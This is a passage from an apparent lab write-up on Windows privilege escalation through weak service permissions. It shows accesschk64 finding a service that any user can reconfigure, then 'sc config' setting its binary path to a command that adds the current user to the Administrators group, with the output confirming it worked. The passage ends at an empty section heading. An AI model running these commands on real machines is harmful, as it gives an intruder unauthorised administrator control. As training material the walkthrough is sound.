
## Binary Paths

In this exploit we are searching fro services with modifiable configurations that we also have permission to restart. By changing the path of the binary executable to a command we want to execute, we can gain privilege access to the machine.

To find services with modifiable configurations, we can use the `accesschk64` tool with the following flags.

- `-u`: Suppress errors
- `-w`: Only show objects with write access
- `-c`: Display the service name
- `-v`: Verbose

Since we want services with write access to any user we also use the `Everyone *` argument.

```PowerShell
C:\Users\user\Desktop\Tools\Accesschk>accesschk64.exe -uwcv Everyone *

Accesschk v6.10 - Reports effective permissions for securable objects
Copyright (C) 2006-2016 Mark Russinovich
Sysinternals - www.sysinternals.com

RW daclsvc
        SERVICE_QUERY_STATUS
        SERVICE_QUERY_CONFIG
        SERVICE_CHANGE_CONFIG
        SERVICE_INTERROGATE
        SERVICE_ENUMERATE_DEPENDENTS
        SERVICE_START
        SERVICE_STOP
        READ_CONTROL


C:\Users\user\Desktop\Tools\Accesschk>accesschk64.exe -wuvc daclsvc

Accesschk v6.10 - Reports effective permissions for securable objects
Copyright (C) 2006-2016 Mark Russinovich
Sysinternals - www.sysinternals.com

daclsvc
  Medium Mandatory Level (Default) [No-Write-Up]
  RW NT AUTHORITY\SYSTEM
        SERVICE_ALL_ACCESS
  RW BUILTIN\Administrators
        SERVICE_ALL_ACCESS
  RW Everyone
        SERVICE_QUERY_STATUS
        SERVICE_QUERY_CONFIG
        SERVICE_CHANGE_CONFIG
        SERVICE_INTERROGATE
        SERVICE_ENUMERATE_DEPENDENTS
        SERVICE_START
        SERVICE_STOP
        READ_CONTROL
```

We find that there is a service named `daclsvc` with  `SERVICE_CHANGE_CONFIG` enabled. If we query just the service, we get the following information.

```PowerShell
C:\Users\user\Desktop\Tools\Accesschk>sc qc daclsvc
[SC] QueryServiceConfig SUCCESS

SERVICE_NAME: daclsvc
        TYPE               : 10  WIN32_OWN_PROCESS
        START_TYPE         : 3   DEMAND_START
        ERROR_CONTROL      : 1   NORMAL
        BINARY_PATH_NAME   : "C:\Program Files\DACL Service\daclservice.exe"
        LOAD_ORDER_GROUP   :
        TAG                : 0
        DISPLAY_NAME       : DACL Service
        DEPENDENCIES       :
        SERVICE_START_NAME : LocalSystem
```

There is a `BINARY_PATH_NAME` value and since we can modify the config, we can change this to any command we want.

```PowerShell
C:\Users\user\Desktop\Tools\Accesschk>sc config daclsvc binpath= "net localgroup administrators user /add"
[SC] ChangeServiceConfig SUCCESS

C:\Users\user\Desktop\Tools\Accesschk>sc qc daclsvc
[SC] QueryServiceConfig SUCCESS

SERVICE_NAME: daclsvc
        TYPE               : 10  WIN32_OWN_PROCESS
        START_TYPE         : 3   DEMAND_START
        ERROR_CONTROL      : 1   NORMAL
        BINARY_PATH_NAME   : net localgroup administrators user /add
        LOAD_ORDER_GROUP   :
        TAG                : 0
        DISPLAY_NAME       : DACL Service
        DEPENDENCIES       :
        SERVICE_START_NAME : LocalSystem
```

Now we simply need to start the service and our user `user` will be added to the administrator group. Also note that the service will fail to start since we have changed the bin path.

```PowerShell
C:\Users\user\Desktop\Tools\Accesschk>net localgroup administrators
Alias name     administrators
Comment        Administrators have complete and unrestricted access to the computer/domain

Members
-------------------------------------------------------------------
Administrator
TCM
The command completed successfully.

C:\Users\user\Desktop\Tools\Accesschk>sc start daclsvc
[SC] StartService FAILED 1053:

The service did not respond to the start or control request in a timely fashion.

C:\Users\user\Desktop\Tools\Accesschk>net localgroup administrators
Alias name     administrators
Comment        Administrators have complete and unrestricted access to the computer/domain

Members
-------------------------------------------------------------------
Administrator
TCM
user
The command completed successfully.
```


## Unquoted Service Paths

